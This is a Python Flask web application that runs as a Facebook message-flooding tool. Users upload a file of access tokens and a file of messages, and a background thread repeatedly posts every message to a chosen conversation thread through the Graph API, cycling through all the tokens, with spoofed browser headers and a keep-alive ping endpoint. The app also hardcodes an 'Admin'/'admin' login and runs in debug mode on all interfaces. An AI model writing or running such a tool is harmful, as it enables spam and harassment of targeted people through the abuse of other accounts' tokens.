from flask import Flask, request, render_template, redirect, url_for, session, jsonify
import requests
from threading import Thread, Event
import time
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.debug = True

# Global variables for tracking
active_users = {}
start_time = datetime.now()
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_event = Event()
threads = []

def clean_inactive_users():
    while True:
        current_time = time.time()
        # Remove users inactive for more than 5 minutes
        inactive_users = [user for user, last_seen in active_users.items() 
                        if current_time - last_seen > 300]
        for user in inactive_users:
            del active_users[user]
        time.sleep(60)  # Check every minute

def get_uptime():
    uptime = datetime.now() - start_time
    days = uptime.days
    hours, remainder = divmod(uptime.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def send_messages(access_tokens, thread_id, mn, time_interval, messages):
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"Message sent using token {access_token}: {message}")
                else:
                    print(f"Failed to send message using token {access_token}: {message}")
                time.sleep(time_interval)

def login_required(f):
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        if 'username' in session:
            active_users[session['username']] = time.time()
        return f(*args, **kwargs)
    decorated_function.__name__ = f.__name__
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == "Admin" and password == "admin":
            session['logged_in'] = True
            session['username'] = username
            active_users[username] = time.time()
            return redirect(url_for('send_message'))
        else:
            return render_template('login.html', error="Invalid credentials")
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    if 'username' in session:
        del active_users[session['username']]
    session.pop('logged_in', None)
    session.pop('username', None)
    return redirect(url_for('login'))

@app.route('/stats')
def get_stats():
    return jsonify({
        'active_users': len(active_users),
        'uptime': get_uptime()
    })

@app.route('/', methods=['GET', 'POST'])
@login_required
def send_message():
    global threads
    if request.method == 'POST':
        token_file = request.files['tokenFile']
        access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        if not any(thread.is_alive() for thread in threads):
            stop_event.clear()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages))          
            thread.start()

    return render_template('index.html')

@app.route('/stop', methods=['POST'])
@login_required
def stop_sending():
    stop_event.set()
    return 'Message sending stopped.'

# UptimeRobot ping endpoint
@app.route('/ping')
def ping():
    return 'OK', 200

if __name__ == '__main__':
    # Start the inactive user cleanup thread
    cleanup_thread = Thread(target=clean_inactive_users, daemon=True)
    cleanup_thread.start()
    
    app.run(host='0.0.0.0', port=5000)